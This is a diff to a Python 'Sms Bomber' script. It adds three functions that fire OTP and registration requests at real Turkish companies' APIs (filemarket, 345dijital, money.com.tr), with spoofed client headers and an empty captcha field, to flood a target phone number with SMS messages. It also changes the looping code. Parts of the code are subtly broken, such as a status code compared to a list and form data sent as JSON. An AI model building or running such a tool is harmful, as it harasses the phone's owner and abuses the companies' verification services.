@@ -559,14 +559,68 @@ def pinarsu(numara):
     else:
         print(Fore.RED + "[-] Pinarsu Başarısız!")
 
+def filemarket(numara):
+    url = "https://api.filemarket.com.tr:443/v1/otp/send"
+    payload = {
+        "mobilePhoneNumber": f"90{numara}"
+    }
+    headers = {"Accept": "*/*", "Content-Type": "application/json",
+               "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS",
+               "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"
+               }
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == 202:
+        print(Fore.GREEN + "[+] Filemarket Başarılı!")
+    else:
+        print(Fore.RED + "[-] Filemarket Başarısız! ")
 
-main = [pinarsu, totalenergies, ikinciyeni, ozdilekteyim, komagene, totalenergies, Bim, houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
+def digital(numara):
+    url = "https://api.345dijital.com:443/api/users/register"
+    payload = {
+        "email": "",
+        "name": "Memati",
+        "phoneNumber": f"+90{numara}",
+        "surname": "Bas"
+    }
+
+    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
+               "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
+               "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"
+               }
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == [200 , 202]:
+        print(Fore.GREEN + "[+] 345Digital Başarılı!")
+    else:
+        print(Fore.RED + "[-] 345Digital Başarısız!")
+
+def money(numara):
+    url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
+    payload = {
+        "phone": f"{numara[:3]} {numara[3:10]}",
+        "GRecaptchaResponse": ''
+    }
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*",
+               "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi",
+               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest",
+               "Origin": "https://www.money.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty",
+               "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers",
+               "Connection": "keep-alive"
+               }
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == 200:
+        print(Fore.GREEN + "[+] Money Başarılı!")
+    else:
+        print(Fore.RED + "[- Money Başarısız!")
+
+
+
+main =  [money, digital, filemarket, pinarsu, totalenergies, ikinciyeni, ozdilekteyim, komagene, totalenergies, Bim, houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
 os.system("cls" if os.name == "nt" else "clear")
 for line in flx:
     print(Fore.RED + line)
 
 print("Developer By : FLX                    Sms Bomber\n")
-print(Fore.MAGENTA +"20 SMS SERVİS\n")
+print(Fore.MAGENTA +"25 SMS SERVİS\n")
 
 print(Fore.YELLOW + "1 - Normal Sms")
 print(Fore.YELLOW + "2 - Turbo Sms")
@@ -632,15 +686,12 @@ elif seçim == "2":
     for line in sms:
         print(Fore.RED + line)
 
-    length = len(main)
     i = 0
     try:
         while True:
             func = main[i]
             func(numara)
             i += 1
-            if i == length:
-                i = 0
     except KeyboardInterrupt:
         print(Fore.RED + "\nProgram sonlandırıldı.")
         sys.exit()
